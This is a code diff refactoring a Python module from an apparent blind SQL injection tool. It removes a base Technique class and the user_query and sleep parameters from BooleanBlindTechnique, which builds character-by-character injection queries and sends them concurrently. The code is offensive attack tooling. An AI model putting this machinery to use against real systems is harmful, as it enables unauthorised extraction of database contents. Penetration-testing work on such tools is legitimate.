@@ -14,31 +14,6 @@ from copy import copy
 
 __all__ = ['BooleanBlindTechnique','FrequencyTechnique']
 
-###########
-# Interface
-###########
-
-class Technique(object):
-    '''
-    This is a sql injection teqnique. Eg. Union based or Time based... Techniques need
-    to implement at minimum the run method which is what actually launches the technique.
-    Techniques will usually also take a user_query (query we are trying to run on the db).
-    The class init init will (almost?) always take a make_request_func as a param. This
-    option specifies the function to call to make an actual request. 
-    '''
-    def __init__(self,query,requester):
-        self.query = query
-        self.requester = requester
-
-        if type(self) == Technique:
-            raise NotImplemented
-
-    def run(self):
-        '''
-        run the exploit
-        '''
-        raise NotImplemented("technique.run")
-
 
 #########################
 # Binary Search Technique
@@ -175,11 +150,11 @@ class BlindCharacter(object):
         return id(self)
 
 
-class BooleanBlindTechnique(Technique):
-    def __init__(self, *args, **kwargs):
+class BooleanBlindTechnique:
+    def __init__(self, query, requester):
+        self.query = query
+        self.requester = requester
         self.rungl = None
-
-        super(BooleanBlindTechnique,self).__init__(*args,**kwargs)
 
     def _reset(self):
         '''
@@ -219,11 +194,9 @@ class BooleanBlindTechnique(Technique):
 
             #build out our query object
             query = copy(self.query)
-            query.set_option('user_query',self.user_query)
             query.set_option('row_index',str(row_index))
             query.set_option('char_index',str(char_index))
             query.set_option('char_val',str(ord(char_val)))
-            query.set_option('sleep',str(self.sleep))
             query.set_option('comparator',comparator)
             query_string = query.render()
 
@@ -353,13 +326,11 @@ class BooleanBlindTechnique(Technique):
         gevent.killall(self.request_makers)
         gevent.joinall(self.request_makers)
 
-    def run(self,user_query,row_len=None,concurrency=20,sleep=0):
+    def run(self,row_len=None,concurrency=20):
         '''
         run the exploit. returns the data retreived.
-            :user_query     this is the query whose result we are trying to get out of the vulnerable application. 
             :concurrency    how many gevent "threads" to use. This is useful for throttling the attack.
             :row_len        An estimated starting point for the length of rows. This will get adjusted as the attack goes on.
-            :sleep          if this is time based blind SQLi, then we will need to know how much to tell the DB to sleep.
         '''
         self.run_start_time = time()
 
@@ -367,8 +338,6 @@ class BooleanBlindTechnique(Technique):
             self.rungl.kill()
 
         self.row_len = row_len
-        self.sleep = sleep
-        self.user_query = user_query
         self.concurrency = concurrency
 
         #start fresh
